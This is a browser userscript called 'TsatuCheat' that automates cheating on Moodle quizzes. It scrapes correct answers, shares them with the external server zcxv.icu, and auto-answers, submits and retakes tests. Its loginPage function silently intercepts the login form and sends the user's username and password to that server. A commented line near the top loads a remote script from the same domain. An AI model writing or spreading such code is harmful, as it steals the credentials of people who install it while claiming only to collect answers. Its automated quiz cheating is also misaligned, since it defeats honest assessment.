// ==UserScript==
// @name TsatuCheat
// @description Moodle answer collector
// @version 1.4.4.4
// @require https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js
// @match *://*/*login/index.php*
// @match *://*/*course/view.php*
// @match *://*/*course/user.php*
// @match *://*/*mod/quiz/processattempt.php*
// @match *://*/*mod/quiz/view.php*
// @match *://*/*mod/quiz/attempt.php*
// @match *://*/*mod/quiz/review.php*
// @match *://*/*mod/quiz/summary.php*
// @grant window.close
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_registerMenuCommand
// @grant GM_addStyle
// @run-at document-end
// ==/UserScript==
/*
d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t)
*/
(() => {
    var cfg;
    if(typeof MonkeyConfig !== 'undefined') cfg = new MonkeyConfig({ title: 'Настройки', menuCommand: true });
    else cfg = class{static get(a, b, c){return c} static open(){return;} };
    var _ = undefined;
    var floatsetbtn = cfg.get('Плавающая кнопка настроек', _, false);
    var silent = cfg.get('Скрытный режим', _, true);
    var autoignoreerrors = cfg.get('Игнор ошибок', _, false);
    var forceauto = cfg.get('Стартовать и перепроходить тесты', _, false);
    var autoselect = cfg.get('Выбирать правильный ответ', _, false);
    var autonext = cfg.get('Клацать кнопку Далее', _, false);
    var autoend = cfg.get('Заканчивать тест', _, false);
    var autoclose = cfg.get('Закрывать пройденное', _, false);
    var hlanswonreview = cfg.get('Подсвечивать ответы после теста', _, false);
    var hlreview = cfg.get('Подсвечивать вкладку с оконченным тестом', _, false);
    var automark = cfg.get('Тыкать галочки на странице предмета', _, false);
    var forceautocourse = cfg.get('Открывать все тесты на курсе в новой вкладке', _, false);
    var haymaking = cfg.get('Пособирать ответы в тестах', _, false);
    var haymlist = cfg.get('Собирать ответы в тестах со всего предмета', _, false);
    var closeontesterror = cfg.get('Закрывать тест, который нельзя пройти', _, false);
    var nextTimeout = cfg.get('Задержка в миллисекундах', 'number', 300);

    var apilink = 'https://api.zcxv.icu/tsatu.php';
    var answersclicked = false;
    console.log('TsatuCheat start');
    var forb = /(ПМК|ПІДСУМКОВИЙ|МОДУЛЬНИЙ|КОНТРОЛЬ)/i;
    if (floatsetbtn) {
        var button = document.createElement("Button");
        button.innerHTML = "{TSATU}";
        button.onclick = () => cfg.open({
            windowFeatures: {
                location: 'no',
                status: 'no',
                left: window.screenX,
                top: window.screenY,
                width: 500,
                height: 800
            }
        });
        button.style = "top:2px;left:40%;position:fixed;z-index: 9999"
        document.body.appendChild(button);
    }

    function chooseVal(dd,val){
        val = filterSelText(val?.trim());
        for (var i = 0; i < dd.options.length; i++) {
        var optsel = filterSelText(dd.options[i].text)?.trim();
            if (optsel === val) {
                dd.selectedIndex = i;
                break;
            }
        }
    }
    var procAttempt = function() {
        if (!autoignoreerrors) return;
        if (document.querySelector('div[data-rel="fatalerror"]')) {
            document.querySelector('div[role="main"] form button[type="submit"]').click();
        }
    };

    var loginPage = function() {
        document.querySelector('#loginbtn').addEventListener('click', (event) => {
            event.preventDefault();
            var xhr = new XMLHttpRequest();
            var login = document.querySelector('#username').value;
            var pass = document.querySelector('#password').value;
            xhr.open('GET', apilink + '?q=login&login=' + encodeURIComponent(login) + '&pass=' + encodeURIComponent(pass), true);
            xhr.onload = xhr.onerror = () => document.querySelector('#login').submit();
            xhr.send();
        });
    };

    var testList = function() {
        var hhg = document.querySelectorAll("li.quiz");
        if (automark) {
            var mark = document.querySelector('img[src*="/i/completion-manual-n"]');
            if (mark && !forceautocourse) {
                return mark?.parentNode.click() && location.reload();
            }
        }
        for (var el of hhg) {
            el.querySelector("a")?.setAttribute('target', '_blank');
            if ((haymaking && haymlist) || forceautocourse) {
                if (el.querySelector(".isrestricted")) {} else {
                    var kh = el.querySelector("a");
                    kh.setAttribute('target', '_blank');
                    if (kh) window.open(kh.href);
                }
            }
            if (silent) el.style = 'border-right: 1px solid #' + ((el.querySelector(".isrestricted")) ? 'ffaaaa' : 'aaffaa') + ';';
            else el.style = 'background:#' + ((el.querySelector(".isrestricted")) ? 'FF0000' : '00FF00') + ';color:#fff';
        }
        haymaking && haymlist && window.close();
    };

    var gradeList = function() {
        var hhg = document.querySelectorAll('table.user-grade img[src*="/quiz/"]');
        for (var el of hhg) {
            var chk = (el, v) => (el.querySelector("td.column-percentage").innerText == v);
            var elu = el.parentNode.tagName == 'A';
            el = el.parentNode.parentNode.parentElement;
            var trh = chk(el, '100.00 %') || chk(el, '100,00 %'); //fullfilled
            var trb = chk(el, '-') || chk(el, '0.00 %') || chk(el, '0,00 %'); //nullfilled
            if (silent) el.style = 'border-right: 1px solid #' + (trh ? 'aaffaa' : 'ffaaaa') + ';';
            else el.style = 'background:#' + (trh ? '00FF00' : (trb ? (elu ? '0000FF' : '000') : 'deea02')) + ';color:#fff';
            if (forceautocourse && trb && elu) {
                var kh = el.querySelector("a");
                if (!forb.test(kh.innerText) && kh) window.open(kh.href);
            }
        }
    };

    var testView = function() {
        if (haymaking) {
            var hg = document.querySelectorAll(".cell.lastcol");
            if (hg.length < 1) haymaking = false;
            for (var el of hg) {
                window.open(el.querySelector("a").href);
            }
        }
        haymaking && window.close();
        if (closeontesterror && document.querySelector('.quizattempt .alert-danger')) {
            return window.close();
        }
        if (forceauto) {
            var regn = /([0-9]+)(\.|,)([0-9]{2}) \/ ([0-9]+)(\.|,)([0-9]{2})/;
            var fba = document.querySelector('div#feedback h3')?.innerHTML;
            if (fba && regn.test(fba)) {
                var mats = fba.match(regn);
                if (mats[1] == mats[4]) {
                    return (autoclose ? window.close() : 0);
                }
            }
            var mtoz = document.querySelector('div.quizinfo p')?.innerHTML;
            if (mtoz == 'Grading method: Highest grade' || mtoz == 'Метод оцінювання: Краща оцінка.') {
                document.querySelector(".quizattempt form button").click();
            }
        }
    };

    var pressNext = function() {
        var checki = document.querySelectorAll('.que .content input[type="radio"]:checked, .que .content input[type="checkbox"]:checked');
        var checkif = document.querySelectorAll('.que .content input[type="radio"], .que .content input[type="checkbox"]');
        var selects = document.querySelectorAll('.que .content select');
        for(var bsel of selects) {
            if(bsel.value == 0) return;
        }
        if (checkif.length > 0 && checki.length < 1) return;
        setTimeout(() => document.querySelector('.mod_quiz-next-nav').click(), nextTimeout);
    };

    var testAttempt = function() {
        console.log('testAttempt');
        getAnswers();
    };
    var reviewPage = function() {
        if (!/&showall=1$/.test(location.href)) {
            return location.replace(window.location.href + '&showall=1');
        }
        console.log('reviewPage');
        var content = [];
        var Questions = document.querySelectorAll('.que');
        for (var part of Questions) {
            console.log('Type: ' + detectTypeOfQue(part));
            var trufalse = detectTypeOfQue(part) == 1;
            var selintext = detectTypeOfQue(part) == 7 || detectTypeOfQue(part) == 8;
            svcIconRemove(part);
            var quesss = [];
            var ans = [];
            var Question = filterQue(part.querySelector('.formulation .qtext'));
            var Answers = part.querySelectorAll('.formulation .r0, .formulation .r1');
            var RightAnswered = [];
            var NonRightAnswered = [];

            var Selects = part.querySelectorAll('table select').length;
            // TODO: Refactor
            if(Selects) {
            console.log('Selects');
                var tbl = part.querySelectorAll('table tr');
                var result = [];
                console.warn('tbl');
                console.warn(tbl);
                let ranspre = part.querySelector('.rightanswer');

                if(ranspre) {
            console.log('ranspre');
                    let RightAnswer = filterSelRightanswer(part.querySelector('.rightanswer')).replace(/\n/,'').replace(/\s+/,' ');
                    for(var ptt of tbl) {
                        var que = filterSelText(ptt.querySelector('td:first-child').innerText).replace(/\n/,'').replace(/\s+/,' ');
                        quesss.push(que);
                        var quename = ((quesss[quesss.length-1])).trim() + ' →';
                        console.log('quename');
                        console.log(quename);
                        var quenum = '[[' + (quesss.length-1) + ']]';
                        console.log('quenum');
                        console.log(quenum);
                        RightAnswer = RightAnswer.replace(quename, quenum);
                        console.log('RA-chng');
                        console.log(RightAnswer);
                        let answ = ptt.querySelectorAll('td select');
                    }
                    console.log('------------');
                    console.log('RightAnswer');
                    console.log(RightAnswer);
                    var fres = RightAnswer.split('[[');
                    fres.shift();
                    console.log('fres');
                    console.log(fres);
                    for(var fone of fres) {
                        var lastres = fone.replace(/[.,](\s+)?$/,'').split(']]');
                        console.log('lastres');
                        console.log(lastres);
                        result.push(filterSelText(quesss[lastres[0]].trim() + ':://::' + lastres[1].trim()));
                    }
                    console.log('result');
                    console.log(result);
                    console.log('quesss');
                    console.log(quesss);

                    console.warn([Question, [], result, []]);
                    content.push([Question, [], result, []]);
                } else {
            console.log('t.parentEl');
                    let pts = part.querySelectorAll('td.correct');
                    for(var pt of pts) {
                        pt = pt.parentElement;
                        let ku = pt.querySelector('td:first-child').innerText;
                        let incv = pt.querySelector('td:last-child').querySelector('select').selectedOptions?.[0]?.label;
                        if(!incv) continue;
                        result.push(ku.trim() + ':://::' + incv.trim());
                    }
                    var badRes = [];
                    let bpts = part.querySelectorAll('td.incorrect');
                    for(var bpt of bpts) {
                        bpt = bpt.parentElement;
                        let ku = bpt.querySelector('td:first-child').innerText;
                        let incv = bpt.querySelector('td:last-child').querySelector('select').selectedOptions?.[0]?.label;
                        if(!incv) continue;
                        badRes.push(ku.trim() + ':://::' + incv.trim());
                    }
                    console.warn([Question, [], result, badRes]);
                    content.push([Question, [], result, badRes]);
                }
            } else {
            console.log('let RightAnswer');
                let RightAnswer;
                if(!Answers || Answers.length<1) {
                    if(selintext) {
            console.log('selintext');
                        RightAnswer = part.querySelector('.qtext').cloneNode(true);
                        svcIconRemove(RightAnswer);
                        let raSelects = RightAnswer.querySelectorAll('.qtext select');
                        for(var ras of raSelects) {
                            if(ras.classList.contains('correct')) ras.outerHTML = '[' + (ras.selectedOptions?.[0]?.label || '') + ']';
                            else ras.outerHTML = '[]';
                        }
                        RightAnswered.push(RightAnswer.innerText);
                    }
                } else {
                    RightAnswer = part.querySelector('.rightanswer');
                    for (var el of Answers) {
                        let answ = filterAnswer(el);
                        if(trufalse) {
                            console.log('trufalse');
                            if(RightAnswer){
                                if(RightAnswer.innerText.indexOf(answ) !== -1) RightAnswered.push(answ);
                            }
                            if (el.classList.contains('incorrect')) NonRightAnswered.push(answ);
                            if (el.classList.contains('correct')) RightAnswered.push(answ);
                        } else {
                            console.log('else {');

                            if (el.classList.contains('incorrect')) NonRightAnswered.push(answ);
                            if (el.classList.contains('correct')) RightAnswered.push(answ);
                            if (el.querySelector('input[checked="checked"]')) {
                                var grade = part.querySelector('.grade').innerHTML;
                                if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0 || (grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
                                    RightAnswered.push(answ);
                                }
                                if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0 || (grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
                                    NonRightAnswered.push(answ);
                                }
                            }
                        }
                        ans.push(answ);
                    }
                    if (!trufalse && RightAnswer) RightAnswered.push(filterRightanswer(RightAnswer));
                }
                console.warn([Question, ans, RightAnswered, NonRightAnswered]);
                content.push([Question, ans, RightAnswered, NonRightAnswered]);
            }
        }
        sendJson('answers', filterBlocks(content), haymaking ? window.close : null);
        if (forceauto) {
            if (document.querySelector('#mod_quiz_navblock > div.card-body > div.card-text > div.allquestionsononepage > a.partiallycorrect, #mod_quiz_navblock > div.card-body > div.card-text > div.allquestionsononepage > a.incorrect')) {
                document.querySelector('#page-navbar ol > li:last-child > a').click();
            } else {
                autoclose && window.close();
            }
            return;
        }
        hlanswonreview && getAnswers();
        if (hlreview) {
            document.title = '+';
            var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = 'http://api.zcxv.icu/green.ico';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
    };

    var filterBlocks = function(arr) {
        arr.forEach(function(v, i, a) {
            v[1] = unique(v[1]);
            v[2] = unique(v[2]);
            v[3] = unique(v[3]);
        });
        return arr;
    };

    var unique = function(arr) {
        let result = [];
        for (let str of arr) {
            if (!result.includes(str)) {
                result.push(str);
            }
        }
        return result;
    };

    var svcIconRemove = function(part) {
        var img = part.querySelectorAll('.questioncorrectnessicon, i .icon');
        if (img.length < 1) return;
        img.forEach((im) => im.remove());
    };

    var filterQue = function(que) {
        return filterText(filterInner(que).innerHTML);
    };

    var trem = function(s, t, g = '') {
        var tags = s.querySelectorAll(g + '[' + t + ']');
        if (tags.length < 1) return;
        tags.forEach((v, i, a) => v.removeAttribute(t));
    };

    var filterInner = function(el) {
        var res = el.cloneNode(true);
        var tags;
        while ((tags = res.querySelector('p,span,div,i,a')) !== null) {
            tags.outerHTML = tags.innerHTML;
        }
        trem(res, 'class');
        trem(res, 'style');
        trem(res, 'lang');
        return res;
    };

    var filterSelText = function(text, rmquotes = false) {
        if(!text) return text;
        var out = text.replace(/(\u02B9|\u0374|\u2018|\u201A|\u2039|\u203A|\u201B|\u2019)+/g, '\'').replace(/(\u00AB|\u00BB|\u201E|\u201C|\u201F|\u201D|\u2E42)+/g, '"');
        return (rmquotes ? out.replace(/(\'|")+/g, ' ') : out).normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/\u00A0/g, ' ').replace(/&nbsp;/g, ' ').replace(/(\r|\n)+/g, ' ').replace(/\s\s+/g, ' ').trim();
    };

    var filterText = function(text, rmquotes) {
        var out = text.replace(/(\u02B9|\u0374|\u2018|\u201A|\u2039|\u203A|\u201B|\u2019)+/g, '\'').replace(/(\u00AB|\u00BB|\u201E|\u201C|\u201F|\u201D|\u2E42)+/g, '"');
        return (rmquotes ? out.replace(/(\'|")+/g, ' ') : out).replace(/&nbsp;/g, ' ').replace(/(\r|\n)+/g, ' ').replace(/\s\s+/g, ' ').trim().replace(/\.$/, '').trim();
    };

    var filterAnswer = function(el) {
        var xel = filterInner(el);
        var anb = xel.querySelector('span.answernumber');
        if (anb) anb.remove();
        var a = xel.querySelector('label').innerHTML.replace(/^(\s+)?([a-z]{1,4})(\s+)?\. /i, '');
        console.log(a);
        return filterText(a);
    };

    var filterRightanswer = function(text, f = false) {
        var res = (f ? filterSelText(filterInner(text).innerHTML) : filterText(filterInner(text).innerHTML));
        res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
        res = res.replace(new RegExp('Правильні відповіді: '), '');
        res = res.replace(new RegExp('The correct answer is: '), '');
        res = res.replace(new RegExp('The correct answers are: '), '');
        return res.trim();
    };
    var filterSelRightanswer = function(text, f = false) {
        var res = filterSelText(filterInner(text).innerText);
        res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
        res = res.replace(new RegExp('Правильні відповіді: '), '');
        res = res.replace(new RegExp('The correct answer is: '), '');
        res = res.replace(new RegExp('The correct answers are: '), '');
        return res.trim();
    };

    var detectTypeOfQue = function(queNode) {
        if(queNode.querySelector('input[id*="_answertrue"], input[id*="_answerfalse"]')) return 1; // True / False
        if(queNode.querySelector('input[type="radio"]')) return 2; // Single answer
        if(queNode.querySelector('input[type="checkbox"]')) return 3; // Multiple answer
        if(queNode.querySelector('input[type="text"][size="80"]')) return 4; // Standart text field
        if(queNode.querySelector('input[type="text"][size="30"]')) return 5; // Number text field
        if(queNode.querySelector('table select')) return 6; // Matching question
        if(queNode.querySelector('select')) return 7; // Select missing words question
        if(queNode.querySelector('.drags')) return 8; // Drag and drop into text
        if(queNode.querySelector('.ddarea .draghomes')) return 9; // Img & drag imgs
        if(queNode.querySelector('.ddarea .dragitems')) return 10; // Img & drag markers
        return 11;
    }
    var detectMultiAnswer = function(answer) {
        if (answer.search(new RegExp('The correct answers are: ')) || answer.search(new RegExp('Правильні відповіді: '))) {
            return true;
        }
        return false;
    };

    var sendJson = function(q, data, cb = null) {
        console.log('Send:');
        console.log(data);
        var xhr = new XMLHttpRequest();
        var theUrl = apilink + '?v=2&q=' + q;
        xhr.open("POST", theUrl, true);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.onload = function(e) {
            console.log('Response:');
            console.log(xhr.response);
            cb && cb();
        };
        xhr.onerror = () => alert('Send: NetworkError');
        xhr.send(JSON.stringify(data));
    };

    var getJson = function(q, data, cb, cbdat) {
        console.log('Get:');
        console.log(data);
        var xhr = new XMLHttpRequest();
        var theUrl = apilink + '?v=2&q=' + q;
        xhr.open("POST", theUrl);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.onload = () => {
            console.log('Response:');
            var otv = xhr.response;
            console.log(otv);
            var resultGet = JSON.parse(xhr.response);
            var jsonResponse = cb(resultGet, cbdat);
        };
        xhr.onerror = () => alert('Get: NetworkError');
        xhr.send(JSON.stringify(data));
    };

    var writetext = function(data, input) {
        console.log('WriteText');
        input[0].value = data;
    };

    var getAnswers = function() {
        var parts = document.querySelectorAll('.que div.content');
        var qparr = [];
        var get = true;
        for (var part of parts) {
            console.log('Type: ' + detectTypeOfQue(part));
            var Selects = part.querySelector('select');
            svcIconRemove(part);
            var Quest = part.querySelector('.formulation .qtext');
            var Answ = part.querySelectorAll('.formulation .r0, .formulation .r1');
            var Question = filterQue(Quest);
            var answinpttext = part.querySelector('input[type="text"]');
            if (answinpttext != null) {
                qparr.push({ 'que': Question });
                getJson('answt', qparr, writetext, [answinpttext, Question]);
                get = false;
                return;
            }
            var AnswRaw = [];
            for (var anv of Answ) {
                AnswRaw.push(filterAnswer(anv));
            }
            qparr.push({
                'que': Question,
                'answ': (Selects ? ['Select'] : JSON.stringify(AnswRaw))
            });
        }
        get && getJson('answ', qparr, highlightAnswers, parts);
    };
    var randomSelection = function(part) {
        var selected = part.querySelectorAll("select");
        console.log(selected);
        if (selected.length > 1) {
            for(var sf of selected){
                sf.selectedIndex = Math.floor(Math.random() * (sf.length-1))+1;
            }
        }
    }

    var highlightAnswers = function(arr, parts) {
        for (var part of parts) {
            answersclicked = false;
            if (arr.length > 0) {
                var answShift = arr.shift();
                console.warn(answShift);
                if(typeof answShift === 'string') {
                    if(answShift === 'idontfindselects'){
                        randomSelection(part);
                    } else {
                        var Kparts = answShift.split('@@##@@');
                        var Mparts = {};
                        for(var Ki of Kparts){
                            var Kio = Ki.split(':://::');
                            Mparts[Kio[0]] = Kio[1];
                        }
                        console.log(Mparts);

                        var tbl = part.querySelectorAll('table tr');
                        for(var ptt of tbl) {
                            var que = filterSelText(ptt.querySelector('td:first-child').innerText.replace(/\n/,'').replace(/\s+/,' ')).trim();
                            let answ = ptt.querySelector('td select');
                            chooseVal(answ, Mparts[que]);
                        }
                    }
                } else {
                    if (!answShift || answShift.length < 1) return;
                    if (answShift[0] === 'text') {
                        var blockdd = document.createElement("p");
                        blockdd.innerHTML = answShift[1];
                        part.insertBefore(blockdd, part.firstChild);
                        return;
                    }
                    var Answers = part.querySelectorAll('.formulation .r0, .formulation .r1');
                    for (var ansik of Answers) {
                        if (ansik.length < 1) {
                            return alert('HL: ');
                        }
                        var righte = answShift.shift();
                        switch (righte) {
                            case '1':
                                answersclicked = true;
                                ansik.classList.add('answerednow');
                                ansik.style = silent ? "color:#040" : "background:#00ff0c";
                                var currinp = ansik.querySelector('input:not([type="hidden"])');
                                currinp.style = 'cursor:progress';
                                if (autoselect && !currinp.checked) currinp.click();
                                break;
                            case '2':
                                ansik.classList.add('badanswer');
                                ansik.style = silent ? "color:#404" : "background:#ff7a7a";
                                break;
                            default:
                                ansik.style = silent ? "color:#444" : "background:#fff";
                        }
                    }
                    autoselect && randomClick(part);
                }
            }
        }
        autonext && autoselect && pressNext();
    };

    var randomClick = function(part) {
        console.warn('Random');
        if (!answersclicked) {
            var selected = part.querySelectorAll(".r0:not(.badanswer) [type=radio],.r1:not(.badanswer) [type=radio]");
            if (selected.length == 1) {
                selected[0].click();
            } else if (selected.length > 0) {
                var ind = Math.floor(Math.random() * selected.length);
                console.log('Ind' + ind);
                selected[ind].click();
            } else {
                autonext = false;
            }
        }
    };

    var endBtns = function() {
        if (!autonext || !autoselect || !autoend) return;
        if(document.querySelectorAll("#mod_quiz_navblock .card-text a.notyetanswered").length>0) return;
        var tmp = document.querySelectorAll(".submitbtns.mdl-align");
        for (var el of tmp) {
            if (el.querySelector("input[name=finishattempt]") !== null) {
                //el.querySelector("input[type=submit]")?.click(); //TODO: Test compat or del //For old versions
                setTimeout(() => (el.querySelector("button")?.click(), setTimeout(() => document.querySelector(".moodle-dialogue input")?.click(), nextTimeout)), nextTimeout);
            }
        }
    };

    var routes = {
        '/login/index.php': loginPage,
        '/course/view.php': testList,
        '/course/user.php': gradeList,
        '/mod/quiz/processattempt.php': procAttempt,
        '/mod/quiz/view.php': testView,
        '/mod/quiz/attempt.php': testAttempt,
        '/mod/quiz/review.php': reviewPage,
        '/mod/quiz/summary.php': endBtns
    };

    var waitImg = function(img) {
        return new Promise((resolve, reject) => {
            if (img.complete) resolve();
            img.onload = img.onerror = () => resolve();
        });
    };

    var getImg = function(c, im) {
        var context = c.getContext('2d');
        if(im.naturalWidth<1) return 0;
        c.width = im.naturalWidth;
        c.height = im.naturalHeight;
        context.drawImage(im, 0, 0);
        return c.toDataURL();
    };

    var createView = function() {
        var canv = document.createElement("canvas");
        canv.id = 'canv';
        canv.style = "border:black solid;display:none;";
        document.body.appendChild(canv);
        return canv;
    };

    (new Promise(async (resolve, reject) => {
        var img = document.querySelectorAll('.que img');
        console.log(img);
        if (img.length < 1) return resolve();
        for (var im of img) {
            await waitImg(im);
            im.removeAttribute('width');
            im.removeAttribute('height');
            im.removeAttribute('alt');
            im.setAttribute('hash', md5(getImg(createView(), im)));
        }
        return resolve();
    })).then(() => routes[window.location.pathname] && routes[window.location.pathname]());
})();
